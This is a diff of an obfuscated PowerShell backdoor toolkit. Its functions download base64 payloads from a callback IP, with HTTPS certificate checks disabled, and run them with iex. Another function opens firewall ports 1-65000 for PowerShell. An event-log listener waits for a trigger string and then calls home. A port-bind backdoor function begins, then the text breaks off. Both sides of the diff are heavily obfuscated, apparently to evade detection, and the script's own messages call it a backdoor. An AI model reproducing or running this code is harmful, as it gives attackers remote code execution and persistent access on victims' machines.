@@ -1,4 +1,4 @@
- &('sV') ("HD7"+"f")  ([typE]("{3}{0}{7}{2}{4}{5}{6}{1}" -f 'M','er','serV','sysTE','i','Ce','PoIntmANag','.nEt.') );    &("{2}{1}{0}" -f 'TeM','-i','sEt')  ('v'+'arIablE:'+'H8gJ')  ([TYPe]("{3}{2}{1}{0}" -F'oNvErt','c','M.','sYSte')  ); &("{1}{0}" -f 'et','S') ('2'+'6k')  ([tYpE]("{2}{0}{3}{4}{1}" -f 'T','codiNg','sYsTem.TEx','.','EN')); &("{0}{2}{1}"-f'sET','M','-ITE') ("v"+"AriAb"+"L"+"e:eXk"+"w")  ( [TYpE]("{4}{0}{3}{2}{1}"-F's','.NEt.dnS','Em','T','sy') )  ; &('SV')  ("{0}{1}"-f'D','8JFH') ([TypE]("{1}{8}{3}{5}{2}{0}{6}{4}{7}" -F 'WS','S','IndO','CUR','It','Ity.prINCiPAl.w','IDEnt','Y','E') )  ;  ${eI`JS}  =[TyPE]("{1}{0}" -F'egeX','R');&("{1}{3}{0}{2}" -f 'b','sEt-VAr','le','iA') ("hE"+"8") ([tYpE]("{4}{1}{3}{5}{2}{6}{0}"-f'y','T.sOC','EsSfam','kets.','nE','AddR','iL')) ;   &("{0}{1}"-f's','Et') ('r'+'H2Iz') (  [type]("{1}{5}{0}{2}{3}{4}"-f 'oCkeTS.sock','Ne','et','Ty','pe','T.S')) ; ${o0F}=  [type]("{6}{3}{5}{2}{1}{4}{0}"-F 'YpE','L','o','OCkEts.pRot','T','oc','NET.s');   &("{0}{1}" -f 'se','t')  ("7n"+"X"+"2BS") ( [Type]("{3}{0}{2}{5}{1}{4}"-F '.','oNTrOl','soCk','nEt','COde','ETS.ioc') )  ; &("{0}{1}" -f'S','ET')  ("{1}{0}" -f'e3','X') (  [tyPe]("{2}{0}{1}{3}" -f'cKeTs.SOckEtfl','aG','neT.so','S') );  &('SV')  ('C'+'Qm') (  [tYpE]("{0}{1}"-F'dATE','tIMe') );  
+ $5kzyIT =  [TYpE]("{4}{0}{1}{2}{3}" -F'e','t.SErV','I','CEPoinTmanAGeR','sySTem.n')  ;   $nzV2aP =[tyPe]("{1}{3}{2}{4}{0}"-F 'Rt','SYs','n','tEm.Co','vE') ;  seT ('T'+'1o5')  (  [Type]("{0}{3}{1}{2}" -f'sysTEM.T','nC','oding','exT.e') ) ;SeT-ITEM ("{3}{2}{0}{1}{4}" -f':Tr','i','bLe','varIa','XE') ( [tYPe]("{0}{3}{2}{1}"-F'sysTEm','s','.Dn','.neT') ) ; seT ("ZN"+"u")  (  [type]("{2}{1}{3}{4}{5}{0}{6}" -F 't','ecURitY.PRiNC','s','ipAL.wInDoWs','ID','en','itY'))  ; SET-itEm  ("VArIABle"+":q8WgP"+"c")  ( [TypE]("{0}{1}"-f'rE','gEX'))  ;  Sv  ("{1}{0}" -f 'iUY','l8f') ([typE]("{3}{2}{4}{1}{0}" -f 'EtS.aDDReSsFaMIlY','K','t','NE','.SOc'));sEt-iteM  ("{0}{3}{2}{1}"-f 'vaRiAb','pVj','4','lE:26') ( [typE]("{0}{5}{2}{4}{3}{1}"-F'nET.S','kettYpE','cKeTS.','Oc','s','o') )  ;   SEt-IteM ("{2}{0}{3}{1}"-f 'blE','ACs','VArIa',':E') ([TYPE]("{2}{4}{3}{6}{1}{5}{0}{7}" -F'lT','o','neT.sO','KeT','c','TOcO','S.Pr','yPE') );  set-iTEM ("{3}{2}{0}{1}" -f 'bLE:','jMHB','aRiA','v')  ([TYpE]("{1}{6}{2}{3}{5}{4}{0}" -F'e','NET','SOCkeTS','.IOCOnt','D','rOLCO','.'))  ;   sET-ITem ("vA"+"rIabLE:y"+"4"+"h"+"br") ( [tYpe]("{0}{1}{3}{4}{2}"-f 'NeT.SO','CKeTs.socKETFL','S','A','G'));    Sv  ("I6S"+"5nr") ( [tYpE]("{0}{1}{2}"-f'daT','ET','Ime'));
 
 
 
@@ -6,389 +6,389 @@
 
 
 
-function invOkE-CAllB`Ac`k`i`eX
+function iNv`okE-Ca`LlbAck`IEx
 {
 
 	Param(
-	[Parameter(mANDATory=${tr`Ue},POSitIOn=1)]
-	[string]${C`A`LlB`ACKIP},
-	[Parameter(mAnDAtoRy=${fa`L`se},poSItion=2)]
-	[int]${mE`TH`od}=0,
-	[Parameter(mANDATORy=${Fal`SE},PoSITIoN=3)]
-	[string]${bi`Ts`TeMpFiLe}="$env:temp\ps_conf.cfg",
-	[Parameter(MAnDAtORY=${F`A`lSe},POSITIOn=4)]
-	[string]${rE`souRCe}=("{0}{1}{2}"-f '/fa','vico','n.ico'),
-	[Parameter(mAnDaTory=${f`ALSE},PoSItioN=5)]
-	[bool]${S`ilEnt}=${f`AlsE}
+	[Parameter(mANDatOry=${Tr`uE},poSitION=1)]
+	[string]${cAl`l`BAcKip},
+	[Parameter(mandatoRy=${Fa`LSE},poSitIoN=2)]
+	[int]${me`T`hOD}=0,
+	[Parameter(MAndaToRy=${F`AlSE},posITION=3)]
+	[string]${bI`TSt`eMPFi`Le}="$env:temp\ps_conf.cfg",
+	[Parameter(mANDAtOrY=${F`ALse},POsiTIoN=4)]
+	[string]${R`E`SouRCe}="/favicon.ico",
+	[Parameter(MaNDaTory=${FA`lsE},POsITIon=5)]
+	[bool]${sI`lENT}=${f`A`lSE}
 	)
 	
 	
-	if(${C`AL`LbA`ckiP})
+	if(${c`All`Ba`ckIP})
 	{
 		try {
 			
-			if (${mE`T`HoD} -eq 0)
+			if (${Met`H`OD} -eq 0)
 			{
 				
 				${u`RL}="http://$CallbackIP$resource"
-				if(-not ${si`l`eNt}) {&("{1}{2}{0}" -f'st','writ','e-ho') ('Ca'+'llin'+'g '+'ho'+'me '+'with'+' '+'m'+'ethod'+' '+"$method "+'t'+'o: '+"$url")}
+				if(-not ${SiL`enT}) {write-host "Calling home with method $method to: $url"}
 				
-				${E`Nc} = (&("{3}{1}{2}{0}" -f'ct','w-ob','je','ne') ("{0}{1}{2}"-f 'n','et.webc','lient')).("{2}{0}{4}{3}{1}"-f 'oadst','ng','downl','i','r').Invoke(${u`Rl})
+				${e`NC} = (new-object ("{2}{0}{1}"-f 't','.webclient','ne'))."dOwn`loA`D`String"(${U`Rl})
 			}
 			
-			elseif (${m`E`ThOD} -eq 1)
+			elseif (${meT`h`od} -eq 1)
 			{
-				 ${h`d7f}::"SER`VERcE`R`TiFic`A`T`e`VALIDAtioncALL`BacK" = {${tr`uE}}
+				 $5KZYIt::"S`eRv`e`RC`e`RTiFIcatEVali`DATiON`cAlLB`A`ck" = {${tr`ue}}
 				${u`RL}="https://$CallbackIP$resource"
-				if(-not ${SI`L`EnT}) {&("{1}{0}{2}" -f's','write-ho','t') ('Ca'+'lling'+' '+'ho'+'me '+'wit'+'h '+'me'+'t'+'hod '+"$method "+'to:'+' '+"$url")}
+				if(-not ${s`IlenT}) {write-host "Calling home with method $method to: $url"}
 				
-				${E`Nc} = (&("{1}{0}{2}" -f'-','new','object') ("{3}{2}{1}{0}" -f'bclient','we','t.','ne')).("{1}{0}{2}{3}" -f'wnlo','do','adstrin','g').Invoke(${u`Rl})
+				${E`Nc} = (new-object ("{0}{2}{1}"-f'net.','client','web'))."DO`WnlOaD`St`Ring"(${u`RL})
 			}
 			
-			elseif (${MeT`hod} -eq 2)
+			elseif (${me`TH`oD} -eq 2)
 			{
-				${U`Rl}="http://$CallbackIP$resource"
-				if(-not ${sILe`Nt}) { &("{2}{0}{1}"-f 'te','-host','wri') ('C'+'alling'+' '+'home'+' '+'w'+'ith '+'metho'+'d '+"$method "+'t'+'o: '+"$url")
-				&("{0}{1}{2}" -f'write-','ho','st') ('BITS'+' '+'Temp'+' '+'o'+'u'+'tput '+'to'+': '+"$BitsTempFile")}
-				&("{0}{2}{1}" -f'I','Module','mport-') ("{1}{0}"-f'ts*','*bi')
-				&("{4}{1}{2}{3}{0}" -f 'r','t-Bi','tsTra','nsfe','Star') ${u`Rl} ${Bi`TStEM`PfiLe} -ErrorAction ("{1}{0}"-f 'top','S')
+				${u`RL}="http://$CallbackIP$resource"
+				if(-not ${s`iL`EnT}) { write-host "Calling home with method $method to: $url"
+				write-host "BITS Temp output to: $BitsTempFile"}
+				Import-Module ("{0}{1}" -f '*','bits*')
+				Start-BitsTransfer ${u`RL} ${biTS`T`EM`p`FIle} -ErrorAction ("{1}{0}" -f'op','St')
 				
-				${E`Nc} = &("{1}{3}{0}{2}"-f'nt','Get-','ent','Co') ${bI`T`St`EMPfi`lE} -ErrorAction ("{1}{0}" -f 'op','St')
+				${e`NC} = Get-Content ${biT`StEMp`FILe} -ErrorAction ("{1}{0}"-f'p','Sto')
 				
 				
-				&("{0}{3}{2}{1}" -f'Re','-Item','ove','m') ${BITs`TEm`p`FIlE} -ErrorAction ("{1}{0}{2}{3}" -f'yC','Silentl','ontinu','e')
+				Remove-Item ${B`It`St`eMpF`iLe} -ErrorAction ("{1}{3}{2}{0}"-f 'tinue','Si','entlyCon','l')
 				
 			}
 			else 
 			{
-				if(-not ${s`IlE`NT}) { &("{2}{0}{3}{1}"-f'ri','st','w','te-ho') ("{6}{7}{1}{2}{3}{5}{0}{4}" -f' meth','ro','per call','b','od','ack','Err','or: Imp') -fore ("{1}{0}"-f'd','re')}
+				if(-not ${s`I`leNt}) { write-host "Error: Improper callback method" -fore ("{1}{0}"-f 'ed','r')}
 				return 0
 			}
 			
 			
-			if (${e`NC})
+			if (${e`Nc})
 			{
 				
-				${B} =   ( &("{1}{0}" -f 'tem','I')  ('V'+'ARiABlE:'+'H8GJ') )."v`AlUe"::("{2}{3}{0}{4}{1}"-f 'Base6','ring','F','rom','4St').Invoke(${e`Nc})
-				${D`ec} =  ( &("{1}{2}{0}{3}" -f 'L','gEt-c','hI','ditem') ("vaRi"+"able:"+"26"+"K"))."V`ALUE"::"U`TF8".("{0}{1}{2}"-f 'G','etStrin','g').Invoke(${b})
+				${B} =   (Gi  ("{0}{1}{3}{2}"-f'VarIA','BLe:nz','p','v2A')  ).vALuE::"f`RombAS`E64`stR`ING"(${E`NC})
+				${D`Ec} =  (  gI ("VArIA"+"ble"+":T1o5")).VaLuE::"U`Tf8"."gETStr`i`NG"(${b})
 				
 				
-				&("{1}{0}" -f'x','ie') ${d`EC}
+				iex ${D`EC}
 			}
 			else
 			{
-				if(-not ${S`Il`enT}) { &("{2}{1}{0}" -f'host','rite-','w') ("{5}{4}{2}{0}{1}{3}" -f'a Dow','n','o Dat','loaded',' N','Error:') -fore ("{1}{0}"-f'd','re')}
+				if(-not ${s`ILE`Nt}) { write-host "Error: No Data Downloaded" -fore ("{0}{1}"-f'r','ed')}
 				return 0
 			}
 		}
 		catch [System.Net.WebException]{
-			if(-not ${s`i`lEnT}) { &("{2}{1}{0}"-f 't','e-hos','writ') ("{4}{5}{2}{0}{1}{3}" -f 'llback fai','l','a','ed','Error: Ne','twork C') -fore ("{1}{0}"-f 'd','re')}
+			if(-not ${sIl`Ent}) { write-host "Error: Network Callback failed" -fore ("{0}{1}" -f'r','ed')}
 			return 0
 		}
 		catch [System.FormatException]{
-			if(-not ${si`lE`Nt}) { &("{2}{1}{0}" -f't','os','write-h') ("{3}{4}{7}{5}{1}{2}{0}{8}{6}" -f'ma','4 F','or','Err','or','Base6','blem',': ','t Pro') -fore ("{1}{0}" -f 'ed','r')}
+			if(-not ${s`IlE`NT}) { write-host "Error: Base64 Format Problem" -fore ("{1}{0}" -f 'ed','r')}
 			return 0
 		}
 		catch [System.Exception]{
-			if(-not ${SI`LE`Nt}) { &("{1}{0}{2}" -f 'ho','write-','st') ("{7}{5}{3}{2}{6}{4}{0}{1}"-f 'transfe','r','wn probl','Ukno',' ','r: ','em during','Erro') -fore ("{0}{1}"-f 're','d')}
+			if(-not ${S`ILEnt}) { write-host "Error: Uknown problem during transfer" -fore ("{0}{1}" -f 'r','ed')}
 			
 			return 0
 		}
 	}
 	else
 	{
-		if(-not ${s`IlE`Nt}) { &("{0}{1}{2}" -f'w','rite-ho','st') ("{7}{6}{5}{4}{2}{3}{1}{0}" -f ':(',' home ',' for the',' phone','specified',' ','t','No hos') -fore ("{0}{1}" -f 're','d')}
+		if(-not ${sile`NT}) { write-host "No host specified for the phone home :(" -fore ("{1}{0}"-f'ed','r')}
 		return 0
 	}
 	
 	return 1
 }
 
-function add-PSfIReW`All`R`u`les
+function Ad`D-PS`FIrE`wA`LLru`Les
 {
 
 	Param(
-	[Parameter(MAnDatoRy=${FAl`SE},PosItIOn=1)]
-	[string]${R`u`leN`AMe}=("{5}{2}{0}{4}{3}{1}"-f'ws ','rshell','indo','owe','P','W'),
-	[Parameter(maNdaTORY=${FA`l`Se},positIon=2)]
-	[string]${e`xEp`Ath}=((("{3}{0}{13}{6}{11}{12}{2}{1}{7}{8}{10}{14}{4}{9}{5}{15}" -f '{0}','n','2{0}wi','C:','0','shel','}sy','dowspo','wershe','}power','ll{0}v','ste','m3','windows{0','1.0{','l.exe'))-F  [cHar]92),
-	[Parameter(MaNDaTOry=${F`AL`SE},PosItioN=3)]
-	[string]${PO`RTs}=("{0}{1}" -f'1-6500','0')
+	[Parameter(MaNDaToRY=${FA`LsE},pOsITion=1)]
+	[string]${ruL`en`Ame}="Windows Powershell",
+	[Parameter(maNDAtorY=${F`A`lSe},PoSItioN=2)]
+	[string]${e`xE`PATH}="C:\windows\system32\windowspowershell\v1.0\powershell.exe",
+	[Parameter(maNdatOry=${fAL`SE},poSitIon=3)]
+	[string]${P`oRtS}="1-65000"
 	)
 
-	If (-NOT ([Security.Principal.WindowsPrincipal]  ${d8`Jfh}::("{1}{3}{2}{0}" -f 't','G','en','etCurr').Invoke())."Isin`ROlE"([Security.Principal.WindowsBuiltInRole] ("{0}{2}{1}{4}{3}" -f 'Admi','tr','nis','or','at')))
+	If (-NOT ([Security.Principal.WindowsPrincipal]  (GeT-vArIAblE ("zN"+"U")  -ValueO  )::"GEtCu`RR`eNt"())."IS`inR`OLe"([Security.Principal.WindowsBuiltInRole] "Administrator"))
 	{
-		&("{2}{1}{0}" -f 'ost','rite-H','W') ("{3}{9}{2}{0}{8}{7}{1}{6}{5}{4}" -f 'e',' :(... g',' r','Th',' ',' work!','et to','in','quires Adm','is command')
+		Write-Host "This command requires Admin :(... get to work! "
 		Return
 	}
 	
 	
-	${fW} = &("{0}{2}{1}{3}"-f 'Ne','ec','w-Obj','t') -ComObject ("{1}{0}{2}{3}" -f 'w','hnetcfg.f','po','licy2')
-	${rU`le} = &("{1}{0}{2}{3}"-f'e','N','w','-Object') -ComObject ("{2}{0}{1}{3}{4}"-f'NetCfg','.','H','FWRu','le')
-	${r`uLE}."NA`ME" = ${R`ulE`Name}
-	${r`ule}."ApPl`I`cA`TIOnn`AMe"=${Ex`EP`ATh}
-	${r`ULE}."Pr`Oto`cOL" = 6
-	${RU`lE}."loCA`lpOR`Ts" = ${Po`RTs}
-	${ru`lE}."dIr`ec`TioN" = 2
-	${ru`Le}."E`N`ABlEd"=${T`RUe}
-	${RU`LE}."g`RO`UpinG"=("{2}{1}{0}{4}{5}{3}"-f'api.d','rewall','@fi','5','ll,-','2325')
-	${r`ULE}."P`ROF`ilEs" = 7
-	${rU`Le}."act`i`On"=1
-	${R`uLE}."EDg`eTr`Ave`RSAl"=${f`A`Lse}
-	${F`W}."RU`LeS".("{0}{1}" -f 'A','dd').Invoke(${rU`Le})
+	${fw} = New-Object -ComObject ("{2}{1}{3}{0}"-f'2','cfg.fwp','hnet','olicy')
+	${R`ULE} = New-Object -ComObject ("{2}{1}{3}{0}" -f 'e','NetCf','H','g.FWRul')
+	${R`ulE}."n`AME" = ${Rul`E`Na`ME}
+	${R`ULE}."apP`LICAt`I`Onna`Me"=${e`XEPA`TH}
+	${RU`Le}."p`RO`TOcOL" = 6
+	${rU`LE}."loC`A`LPOrTS" = ${p`oRtS}
+	${ru`LE}."dI`ReCTIOn" = 2
+	${Ru`Le}."E`NA`BlED"=${t`RuE}
+	${R`Ule}."g`Ro`upinG"="@firewallapi.dll,-23255"
+	${ru`LE}."pro`FiL`ES" = 7
+	${R`uLe}."A`cTiON"=1
+	${r`uLe}."EDGetRA`V`E`RSAl"=${f`AlSE}
+	${fw}."r`ulES"."a`Dd"(${ru`lE})
 	
 	
-	${ru`LE} = &("{1}{2}{0}"-f'ject','New-O','b') -ComObject ("{4}{0}{3}{2}{1}"-f 'etCf','Rule','.FW','g','HN')
-	${r`ulE}."N`AMe" = ${rU`LEna`Me}
-	${ru`Le}."a`P`PlIca`TIoNNa`me"=${e`x`epAtH}
-	${ru`Le}."p`RO`TocoL" = 17
-	${RU`Le}."lO`cal`POrtS" = ${P`or`Ts}
-	${rU`le}."di`RecT`Ion" = 2
-	${r`ule}."ena`B`leD"=${t`RUe}
-	${rU`lE}."g`Ro`upiNG"=("{2}{3}{5}{4}{1}{6}{0}" -f '55','.','@fir','e','allapi','w','dll,-232')
-	${R`uLe}."pRoFi`lES" = 7
-	${r`ule}."Act`Ion"=1
-	${ru`lE}."Ed`GE`TrAvErsAl"=${FAL`se}
-	${fw}."r`ulES".("{0}{1}" -f'Ad','d').Invoke(${R`ulE})
+	${r`ULe} = New-Object -ComObject ("{3}{0}{2}{1}"-f '.FWR','le','u','HNetCfg')
+	${rU`Le}."Na`Me" = ${RulE`NAME}
+	${Ru`Le}."APPLICa`Tio`NN`A`me"=${E`x`EpAth}
+	${rU`LE}."p`RoTOcoL" = 17
+	${r`ule}."LoCAL`po`RTS" = ${P`orTs}
+	${rU`le}."DiRe`cTI`ON" = 2
+	${RU`le}."en`AblEd"=${tR`uE}
+	${R`uLE}."GroupI`Ng"="@firewallapi.dll,-23255"
+	${R`uLe}."p`ROfi`LEs" = 7
+	${R`ULe}."aCt`i`oN"=1
+	${Ru`Le}."EDgeTrAVE`R`saL"=${f`A`lse}
+	${Fw}."Rul`es"."a`dd"(${r`uLE})
 	
 	
-	${r`UlE} = &("{2}{0}{1}"-f'b','ject','New-O') -ComObject ("{3}{0}{1}{2}"-f'tCfg.F','WRul','e','HNe')
-	${ru`Le}."n`Ame" = ${RU`L`E`NaME}
-	${Ru`Le}."Ap`plicAtio`Nn`AME"=${exEP`A`Th}
-	${rU`Le}."pr`Otoc`Ol" = 6
-	${rU`Le}."LOcA`lP`oR`Ts" = ${p`o`Rts}
-	${R`UlE}."d`IrecTI`on" = 1
-	${rU`le}."EN`A`BLeD"=${T`RUe}
-	${R`ule}."gROUp`i`Ng"=("{0}{3}{2}{5}{1}{4}" -f '@fire','dll,-','allapi','w','23255','.')
-	${Ru`lE}."P`ROfIl`es" = 7
-	${ru`lE}."AC`TION"=1
-	${R`ULE}."EdgEt`RAv`ER`saL"=${fal`SE}
-	${fw}."RuL`ES".("{0}{1}"-f 'Ad','d').Invoke(${rU`LE})
+	${ru`LE} = New-Object -ComObject ("{1}{0}{2}{3}"-f'fg.F','HNetC','WRu','le')
+	${rU`Le}."NA`mE" = ${Ru`le`NAme}
+	${R`ULe}."a`ppLICationNa`ME"=${E`XepAth}
+	${Ru`LE}."P`R`otOcOl" = 6
+	${R`UlE}."L`O`caLporTS" = ${Por`Ts}
+	${R`ulE}."d`I`REcTiOn" = 1
+	${ru`lE}."ENA`BL`ED"=${tr`UE}
+	${r`UlE}."gro`uPI`Ng"="@firewallapi.dll,-23255"
+	${r`uLE}."Pr`O`FILEs" = 7
+	${r`Ule}."A`C`TiON"=1
+	${ru`lE}."EDgE`TRAV`ERSaL"=${fA`lsE}
+	${F`w}."RU`les"."A`dd"(${RU`lE})
 	
 	
-	${rU`Le} = &("{0}{1}{2}"-f 'N','ew-O','bject') -ComObject ("{2}{1}{0}"-f 'e','ul','HNetCfg.FWR')
-	${R`ule}."NA`mE" = ${r`UlEN`AmE}
-	${ru`lE}."ApP`lICAt`Ionna`mE"=${eXEp`Ath}
-	${R`uLE}."PRotO`col" = 17
-	${R`uLe}."lo`caLp`OrTS" = ${PO`Rts}
-	${rU`LE}."DI`REc`TIon" = 1
-	${ru`lE}."ENA`BLed"=${tR`uE}
-	${rU`LE}."Gr`oUpI`Ng"=("{2}{1}{3}{0}{4}{5}{6}"-f'i.','wal','@fire','lap','dll,-','2325','5')
-	${ru`lE}."profIl`es" = 7
-	${r`UlE}."AC`Ti`oN"=1
-	${RU`le}."E`dGetR`AVErSaL"=${f`AlSE}
-	${F`W}."RUL`Es".("{0}{1}" -f'A','dd').Invoke(${Ru`le})
+	${r`UlE} = New-Object -ComObject ("{0}{1}{2}{3}" -f 'H','NetCfg','.FW','Rule')
+	${r`uLE}."n`AMe" = ${ruleNa`me}
+	${Ru`le}."APp`LicaT`I`oN`NamE"=${ExePa`TH}
+	${rU`Le}."P`Rot`OCol" = 17
+	${RU`Le}."Loc`Alp`ORTs" = ${poR`Ts}
+	${r`ulE}."DIRectI`on" = 1
+	${r`ulE}."en`A`BLeD"=${t`Rue}
+	${RU`Le}."Gr`oUP`iNG"="@firewallapi.dll,-23255"
+	${r`UlE}."PrO`F`ileS" = 7
+	${r`uLE}."A`CTI`ON"=1
+	${R`ule}."Ed`gET`RaV`eRsaL"=${F`ALSe}
+	${F`W}."r`uLEs"."A`Dd"(${R`ule})
 
 }
 
-function I`N`VoKe-`eVeN`TlooP
+function InVOk`e`-EVeNTLoop
 {
 
 	Param(
-	[Parameter(MaNDatory=${TR`Ue},PoSiTIon=1)]
-	[string]${CALlb`A`cK`iP},
-	[Parameter(MANDAtoRy=${Fa`L`se},pOSITIoN=2)]	
-	[string]${T`RiGg`er}=("{1}{0}"-f 'UB','SIXD'), 
-	[Parameter(mAnDatory=${f`A`LsE},pOsITIoN=3)]
-	[int]${t`I`mEOUT}=0,
-	[Parameter(mAnDatOry=${f`Al`SE},pOSItIoN=4)]
-	[int] ${sLe`ep}=1
+	[Parameter(mANdAtOry=${T`RUE},POsiTion=1)]
+	[string]${cAlLBa`Ck`Ip},
+	[Parameter(MaNdAtoRY=${fA`lSE},PosITion=2)]	
+	[string]${tRI`GG`ER}="SIXDUB", 
+	[Parameter(MAnDaTORy=${F`AL`SE},PoSITIOn=3)]
+	[int]${tiM`EoUt}=0,
+	[Parameter(maNDatOry=${fA`LSE},PosiTiON=4)]
+	[int] ${s`lEEP}=1
 	)
 
-	If (-NOT ([Security.Principal.WindowsPrincipal]   ${d`8Jfh}::("{1}{2}{0}" -f'rrent','Get','Cu').Invoke())."i`Sin`RoLE"([Security.Principal.WindowsBuiltInRole] ("{3}{0}{4}{2}{1}" -f'dmi','tor','tra','A','nis')))
+	If (-NOT ([Security.Principal.WindowsPrincipal]   (  vARIABLe ('z'+'NU') -vALUEONl)::"gEtc`ur`ReNT"())."IsiN`RoLE"([Security.Principal.WindowsBuiltInRole] "Administrator"))
 	{
-		&("{0}{2}{1}"-f'Wr','e-Host','it') ("{13}{4}{3}{7}{9}{11}{2}{6}{8}{1}{5}{10}{12}{0}" -f ' ','et ','s Admin :','r','is backdoor ','t','(... ','eq','g','ui','o','re',' work!','Th')
+		Write-Host "This backdoor requires Admin :(... get to work! "
 		Return
 	}
 	
-	&("{1}{2}{0}{3}" -f'-h','writ','e','ost') ('Timeou'+'t'+': '+"$Timeout")
-	&("{1}{0}{2}" -f'rite-','w','host') ('T'+'ri'+'gger: '+"$Trigger")
-	&("{0}{1}{2}"-f'wr','ite-ho','st') ('C'+'a'+'llbac'+'kIP: '+"$CallbackIP")
-	&("{2}{1}{0}"-f 'ost','e-h','writ')
-	&("{3}{1}{2}{0}" -f't','te','-hos','wri') ("{4}{0}{1}{2}{3}" -f'a','rting bac','kdo','or...','St')
+	write-host "Timeout: $Timeout"
+	write-host "Trigger: $Trigger"
+	write-host "CallbackIP: $CallbackIP"
+	write-host
+	write-host "Starting backdoor..."
 	
 	
-	${R`U`NNinG}=${tR`ue}
-	${MaT`ch} =""
-	${s`T`ArttImE} = &("{1}{0}{2}"-f't-da','ge','te')
-	while(${Ru`NNI`Ng})
+	${rUN`Ni`NG}=${t`RUE}
+	${mAT`ch} =""
+	${s`TArt`TImE} = get-date
+	while(${runn`i`Ng})
 	{
 		
-		if (${tI`Me`Out} -ne 0 -and ($(  (  &('lS') ('va'+'R'+'IaB'+'lE:CqM') )."V`ALue"::"N`Ow") -gt ${s`T`AR`TtiMe}.("{1}{2}{0}" -f 'seconds','ad','d').Invoke(${tI`MeOuT})))  
+		if (${timE`ouT} -ne 0 -and ($(  (  vaRIAble ('I6S5n'+'r')  ).VALuE::"N`OW") -gt ${st`A`RTtI`mE}."aDDs`ECO`NDs"(${ti`MEO`ut})))  
 		{
-			${R`unnI`NG}=${f`Al`Se}
+			${rUn`N`inG}=${FA`lSE}
 		}
 		
-		${d} = &("{2}{0}{1}" -f'at','e','Get-D')
-		${nE`Weve`NTS} = &("{0}{1}{2}" -f 'G','et-W','inEvent') -FilterHashtable @{("{1}{2}{0}" -f'me','log','na')=("{2}{1}{0}" -f'ity','ur','Sec'); ("{1}{0}{2}" -f 'ar','St','tTime')=${d}.("{0}{1}{3}{2}" -f 'Add','Sec','s','ond').Invoke(-${sl`EEp})} -ErrorAction ("{0}{3}{4}{2}{1}"-f 'Si','inue','lyCont','len','t') | &('fl') ("{1}{2}{0}"-f 'sage','M','es') | &("{3}{0}{2}{1}"-f'S','ing','tr','Out-')
+		${D} = Get-Date
+		${n`eW`EVEnTs} = Get-WinEvent -FilterHashtable @{"l`og`NAMe"='Security'; "ST`ArTT`IME"=${D}."aDDSecO`N`DS"(-${Sl`eEp})} -ErrorAction ("{2}{1}{0}"-f'ntinue','Co','Silently') | fl ("{1}{2}{0}" -f'e','M','essag') | Out-String
 		
 		
-		if (${nEW`EV`enTs} -match ${triGG`ER})
+		if (${nEw`even`TS} -match ${Tri`Gg`eR})
 		{
-				${rU`NN`ing}=${fAL`Se}
-				${mA`T`ch} = ${CAl`lBA`CkIp}
-				&("{0}{2}{1}" -f 'wr','-host','ite') ('M'+'a'+'tch: '+"$match")
+				${runN`i`NG}=${FA`lSE}
+				${MAt`Ch} = ${C`Al`lbA`ckIP}
+				write-host "Match: $match"
 		}
-		&("{0}{1}" -f'sl','eep') -s ${SL`eEP}
+		sleep -s ${Sl`E`EP}
 	}
-	if(${M`ATCh})
+	if(${m`Atch})
 	{
-		${S`u`CCess} = &("{3}{2}{4}{1}{0}"-f 'IEX','llback','vok','In','e-Ca') ${mAT`Ch}
+		${suc`c`ESS} = Invoke-CallbackIEX ${MA`T`Ch}
 	}
 }
 
-function InV`o`k`E-PorTbiND
+function iNvo`KE`-pORTB`i`ND
 {
 
 	Param(
-	[Parameter(MAnDatorY=${F`A`lse},PosItIon=1)]
-	[string]${c`AllbACk`ip},
-	[Parameter(MANdAToRy=${f`A`lsE},pOSiTion=2)]
-	[string]${l`OCaL`Ip}, 
-	[Parameter(MaNDaTOrY=${fAl`se},PosItIOn=3)]
-	[int]${po`Rt}=4444, 
-	[Parameter(mANDatory=${F`ALsE},posItIoN=4)]
-	[string]${T`RiGGER}=("{0}{1}{2}" -f'Q','AZWS','X123'), 
-	[Parameter(maNDAtoRY=${fA`LSE},poSITion=5)]
-	[int]${T`IMEO`UT}=0
+	[Parameter(MANdatory=${f`AlsE},PoSiTion=1)]
+	[string]${Cal`L`BAckiP},
+	[Parameter(maNDaTOrY=${fA`lse},pOSItIon=2)]
+	[string]${L`ocalIP}, 
+	[Parameter(mANDatorY=${f`ALSe},POsitION=3)]
+	[int]${P`OrT}=4444, 
+	[Parameter(maNdAToRy=${F`AlsE},pOSiTIoN=4)]
+	[string]${t`R`iGgEr}="QAZWSX123", 
+	[Parameter(MAnDAtoRY=${FA`LSE},POSiTion=5)]
+	[int]${TIM`E`ouT}=0
 	)
 	
 	
-	if (-not ${l`oCAlIp}) 
+	if (-not ${LOc`A`lIP}) 
 	{
-		&("{1}{0}" -f 'te','rou') ("{1}{0}" -f 'int','pr') ('0*') | &('%') { 
+		route ("{1}{0}"-f'int','pr') ('0*') | % { 
 			if (${_} -match "\s{2,}0\.0\.0\.0") { 
-				${nu`LL},${NU`lL},${nu`Ll},${lo`c`ALIP},${nu`lL} =  ( &("{1}{2}{0}{3}" -f'i','G','et-vAr','Able')  ('E'+'iJs')  )."v`ALUE"::("{0}{1}{2}"-f 'rep','lac','e').Invoke(${_}.("{2}{1}{0}" -f't','r','trimsta').Invoke(" "),"\s{2,}",",").("{0}{1}"-f's','plit').Invoke(",")
+				${N`ulL},${NU`ll},${N`ulL},${L`oCALIP},${n`uLl} =   (VARiABle  ('Q8w'+'Gpc') -VaLUeoNL  )::"REp`LA`cE"(${_}."trI`MSTa`RT"(" "),"\s{2,}",",")."sPl`it"(",")
 				}
 			}
 	}
 	
 	
-	&("{0}{1}{2}{3}"-f 'w','ri','te-','host') ("{7}{0}{1}{5}{10}{6}{12}{13}{11}{3}{4}{9}{8}{2}"-f'H','IS BACKD',' !!!','AL','L EX','OOR','RES','!!! T','ION','CEPT',' REQUI','IREW',' ','F')
-	&("{2}{1}{0}"-f 't','te-hos','wri') ('Timeou'+'t'+':'+' '+"$Timeout")
-	&("{0}{2}{1}" -f 'wr','ost','ite-h') ('P'+'ort:'+' '+"$Port")
-	&("{2}{0}{1}"-f'ite-h','ost','wr') ('Trig'+'ger:'+' '+"$Trigger")
-	&("{1}{2}{3}{0}" -f 't','write','-h','os') ('Us'+'ing '+'I'+'Pv4 '+'A'+'d'+'dr'+'ess: '+"$LocalIP")
-	&("{1}{0}{2}"-f'e-ho','writ','st') ('C'+'al'+'lbackIP'+': '+"$CallbackIP")
-	&("{0}{1}{2}{3}"-f'wri','te','-hos','t')
-	&("{0}{1}{2}"-f'wri','t','e-host') ("{4}{5}{3}{0}{2}{1}" -f'ing ba','.','ckdoor..','t','Sta','r')
